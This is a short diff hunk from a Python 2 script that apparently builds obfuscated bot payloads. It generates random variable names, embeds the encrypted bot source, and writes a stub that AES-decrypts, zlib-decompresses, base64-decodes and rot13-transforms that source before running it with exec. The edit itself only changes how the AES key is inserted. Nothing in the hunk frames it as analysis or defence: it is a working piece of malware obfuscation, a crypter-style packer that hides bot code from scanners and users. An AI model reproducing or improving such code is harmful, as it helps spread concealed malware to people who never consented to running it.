@@ -93,7 +93,7 @@ botSRC_ = botSRC_ + random.choice(string.letters+string.letters)+"=\""
 botSRC_ = botSRC_+randomString
 mainCodeVar = random.choice(string.letters+string.letters)
 aesobjname = random.choice(string.letters)*3
-botSRC_ = botSRC_+"\"\n"+mainCodeVar+" = \"\"\""+botSRC+"\"\"\"\n"+aesobjname+" = AESCipher(""+AESkey+"")\n"+mainCodeVar+" = "+aesobjname+".decrypt(zlib.decompress(base64.urlsafe_b64decode("+mainCodeVar+"))).encode(\"rot13\")\nexec "+mainCodeVar
+botSRC_ = botSRC_+"\"\n"+mainCodeVar+" = \"\"\""+botSRC+"\"\"\"\n"+aesobjname+" = AESCipher("+AESkey+")\n"+mainCodeVar+" = "+aesobjname+".decrypt(zlib.decompress(base64.urlsafe_b64decode("+mainCodeVar+"))).encode(\"rot13\")\nexec "+mainCodeVar
 fileOut=""
 while 1:
     for x in range(0,12):
